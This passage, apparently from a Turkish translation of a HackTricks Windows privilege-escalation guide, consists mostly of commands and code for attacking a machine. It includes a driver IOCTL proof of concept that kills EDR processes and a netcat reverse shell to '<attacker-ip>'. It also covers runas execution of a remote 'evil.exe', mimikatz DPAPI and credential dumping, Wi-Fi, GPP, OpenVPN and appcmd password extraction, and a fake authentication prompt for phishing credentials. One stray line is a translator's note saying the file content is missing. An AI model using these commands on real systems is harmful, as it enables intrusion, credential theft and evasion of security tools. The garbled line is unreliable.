accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary dosyalarının üzerine yazıp yazamayacağınızı kontrol edin.**\
**İlginç autoruns locations to escalate privileges hakkında daha fazla bilgi edinmek için aşağıdaki sayfayı okuyun:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf garip/zayıf** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver keyfi bir kernel okuma/yazma primitive'ini açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler'larında yaygın), kernel belleğinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için bakınız:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

Modern hive zafiyetleri deterministik düzenler hazırlamanıza, yazılabilir HKLM/HKU alt dallarını kötüye kullanmanıza ve metadata bozulmasını özel bir sürücü olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Tam zinciri öğrenmek için bakınız:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### device object'larında FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalanmış üçüncü taraf driver'lar device object'ini güçlü bir SDDL ile IoCreateDeviceSecure aracılığıyla oluşturur ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'ı ayarlamayı unuturlar. Bu bayrak olmadan, cihaz ekstra bir bileşen içeren bir path ile açıldığında secure DACL uygulanmaz; bu da herhangi bir ayrıcalıksız kullanıcının aşağıdaki gibi bir namespace path kullanarak bir handle elde etmesine imkan verir:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Kullanıcı cihazı açabildiğinde, driver tarafından açığa çıkarılan ayrıcalıklı IOCTL'lar LPE ve müdahale için kötüye kullanılabilir. Doğada gözlemlenen örnek kabiliyetler:
- Belirli süreçlere tam erişimli handle'lar döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlanmamış raw disk okuma/yazma (offline müdahale, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil olmak üzere rastgele süreçleri sonlandırma, böylece kernel aracılığıyla user land'ten AV/EDR kill'e izin verme.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için önlemler
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN'u ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. Process termination veya handle iadesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'i kısıtlayın (access masks, METHOD_*, input validation) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli device isimlerinin (ör. \\ .\\amsdk*) kullanıcı modundaki açılışlarını ve kötüye kullanımı gösteren belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny listelerinizi yönetin.


## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasörde write permissions'iniz varsa** bir process tarafından yüklenen bir DLL'i hijack ederek **escalate privileges** elde edebilirsiniz.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file'da sert kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, devre dışı bırak, devre dışı bırak...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows için Linux Alt Sistemi (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` yolunda da bulunabilir

root kullanıcısı olursanız herhangi bir portta dinleyebilirsiniz (ilk kez `nc.exe` ile bir portta dinlediğinizde, GUI üzerinden `nc`'nin firewall tarafından izin verilip verilmeyeceğini soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz.

`WSL` dosya sistemini şu klasörde keşfedebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik bilgileri yöneticisi / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini saklar; bunlar **Windows**'un **log in the users automaticall**y yapabildiği durumlardadır. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini depolayıp tarayıcılar aracılığıyla otomatik oturum açtıkları izlenimi verebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabildiği kimlik bilgilerini saklar; bu da herhangi bir **Windows application that needs credentials to access a resource** (sunucu veya bir web sitesi) **can make use of this Credential Manager** ve Windows Vault'tan yararlanarak sağlanan kimlik bilgilerini, kullanıcıların sürekli kullanıcı adı ve parola girmesi yerine kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezlerse, bence belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün değildir. Bu nedenle, eğer uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama kasasından o kaynak için kimlik bilgilerini almak üzere bir şekilde **communicate with the credential manager and request the credentials for that resource**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verilen kimlik bilgileriyle `runas` kullanmak.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Şunu unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Veri Koruma API'si (DPAPI)**, esas olarak asimetrik özel anahtarların simetrik olarak şifrelenmesi için Windows işletim sistemi içinde kullanılan bir veri simetrik şifreleme yöntemi sağlar. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcı giriş sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini mümkün kılar**. Sistem şifrelemesi söz konusu olduğunda, sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları %APPDATA%\Microsoft\Protect\{SID} dizininde depolanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunduğu için**, genellikle 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, içeriğinin CMD'de dir komutuyla listelenmesinin engellendiğini, ancak PowerShell ile listelenebildiğini not etmek önemlidir.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanarak bunu deşifre edebilirsiniz.

The **credentials files protected by the master password** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Şifreyi çözmek için uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanabilirsiniz.\
`sekurlsa::dpapi` module ile **çok sayıda DPAPI** **masterkeys**'i **memory**'den çıkarabilirsiniz (eğer root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** genellikle **betikleme** ve otomasyon görevlerinde şifrelenmiş kimlik bilgilerini pratik şekilde depolamak için kullanılır. Bu kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle oluşturuldukları aynı bilgisayarda aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

İçeren dosyadan bir PS credentials'ın **şifresini çözmek** için şu komutu çalıştırabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak **herhangi bir .rdg dosyasını deşifre edin**\
Mimikatz `sekurlsa::dpapi` modülü ile bellekteki birçok DPAPI masterkey'i çıkarabilirsiniz

### Sticky Notes

Kullanıcılar genellikle StickyNotes uygulamasını Windows iş istasyonlarında **şifreleri kaydetmek** ve diğer bilgileri saklamak için kullanır; bunun bir veritabanı dosyası olduğunu fark etmezler. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den şifreleri kurtarmak için Administrator olmanız ve High Integrity level altında çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve **recovered** edilebilir.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` var mı diye kontrol edin .\
Yükleyiciler **SYSTEM privileges ile çalıştırılır**, çoğu **DLL Sideloading (Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt Defterindeki SSH keys

SSH private keys, kayıt defteri anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer bu yolun içinde herhangi bir giriş bulursanız muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve önyükleme sırasında otomatik olarak başlamasını istiyorsanız, çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve ssh ile bir makineye giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın

### Önbelleğe Alınmış GPP Parolası

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel local administrator hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP içindeki parolalar, kamuya belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifreleniyordu ve herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu, kullanıcıların ayrıcalık yükseltmesine yol açabilecek ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, "cpassword" alanı boş olmayan yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda, fonksiyon parolayı çözüyor ve özel bir PowerShell nesnesi döndürüyor. Bu nesne GPP hakkında ve dosyanın konumu hakkında ayrıntılar içeriyor; bu da bu güvenlik açığının tespiti ve giderilmesine yardımcı oluyor.

Bu dosyaları arayın: `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Konfigürasyonu
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials'i iste

Bir kullanıcının veya başka bir kullanıcının credentials'larını bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi credentials'larını veya başka bir kullanıcının credentials'larını girmesini isteyebilirsiniz** (dikkat edin ki, istemciden doğrudan **credentials**'ları **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Bilinen dosyaların bir süre önce **passwords**'ı **clear-text** veya **Base64** olarak içerdiği bilinmektedir.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Belirttiğiniz dosyanın içeriği sağlanmamış. Lütfen src/windows-hardening/windows-local-privilege-escalation/README.md dosya içeriğini yapıştırın veya erişim sağlayın; içerği aldıktan sonra aynı markdown ve tag yapısını bozmadan Türkçeye çevireceğim. Not: kod, teknik isimler, linkler, path'ler ve özel tag'leri çevirmeyeceğim.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin'deki kimlik bilgileri

İçinde kimlik bilgileri aramak için ayrıca Bin'i de kontrol etmelisiniz

Çeşitli programlar tarafından kaydedilen **şifreleri kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri içinde

**Kimlik bilgileri içeren diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
Ayrıca tarayıcıların geçmişini, bookmarks ve favourites öğelerini kontrol et; belki bazı **passwords are** orada saklanmıştır.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

